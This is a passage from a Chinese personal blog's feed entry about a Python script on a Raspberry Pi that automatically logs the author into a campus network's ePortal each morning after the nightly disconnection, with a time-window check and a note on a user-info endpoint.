请求</h3><p>按照校园网的提交格式，使用 python 的 request 大概写一下就可以了，最后他会返回一个 json，看看 json 的 result 值是否为 success</p><pre><code>queryRet = requests.get(&quot;http://123.123.123.123&quot;).textparam = &quot;index\.jsp\?(.*)\&#39;\&lt;\/script\&gt;&quot;queryString = re.search(param, queryRet)[1]postData = &#123;    &quot;userId&quot;: userID,    &quot;password&quot;: str(encryptedPassword),    &quot;service&quot;: urllib.parse.quote(network),    &quot;queryString&quot;: urllib.parse.quote(queryString),    &quot;passwordEncrypt&quot;: &quot;true&quot;,    &quot;validcode&quot;: &quot;&quot;,    &quot;operatorPwd&quot;: &quot;&quot;,    &quot;operatorUserId&quot;: &quot;&quot;,&#125;loginRet = requests.post(&quot;http://x.x.x.x/eportal/InterFace.do?method=login&quot;, data=postData).text</code></pre><p>哦对了，这里 service 我校的方案是传上去一个大大的运营商名字，为什么得这么干我也不是很懂，都是外包的嘛（</p><p>比如 service = “联通” || “移动” # 意义不明</p><p>能够获取到返回的 result 就成啦</p><p>打开网页，联网成功~</p><h2 id="其他玩法"><a href="#其他玩法" class="headerlink" title="其他玩法"></a>其他玩法</h2><p>登录其实到这里就结束了，如果想要获取登录后的个人信息，例如姓名啥的啊乱七八糟的可以请求 @/eportal/InterFace.do?method=getOnlineUserInfo ，发现并不需要带参数，干 Get 就可以了，可以获取到 用户IP/ID/mac地址/用户组/运营商 其他啥啥啥的</p><h3 id="判断是否允许联网时段"><a href="#判断是否允许联网时段" class="headerlink" title="判断是否允许联网时段"></a>判断是否允许联网时段</h3><p>其实这里也挺暴力的，非周末时段12点断网，6点开网，大概这么判断</p><pre><code>def isLimited(self):  now = datetime.datetime.now()  if now.weekday() &lt; 6 and now.hour &lt; 6:      return True  return False</code></pre><p>简 单 粗 暴</p><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>实际上这玩意自从开始写好以后，就没怎么用过，因为学校的网络认证服务器经常单 IP 请求次数一多就直接 block 了，真要用的时候还不是那么能用得上的，这玩意基本弄完就丢一边吃灰了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;开学那段时间刚办完校园网宽带，学校每天晚上 12 点都会定时断网，每天 6 点又会将网络开启，断网就是将同学萌从校园网强制下线，然后禁止登录，每天都要重复登陆一次，觉得有点麻烦，先试了一下校园网是否允许路由器，发现可行，于是乎想着就随手在树莓派上跑个脚本，断网就自动执行。&lt;/p&gt;
&lt;p&gt;写这篇玩意其实是因为没啥东西好水了，随便找个以前的来水一下，顺便记录一下之前的小操作&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="Python" scheme="https://guo.moe/tags/Python/"/>
    
    <category term="校园网" scheme="https://guo.moe/tags/%E6%A0%A1%E5%9B%AD%E7%BD%91/"/>
    
  </entry>
  
</feed>
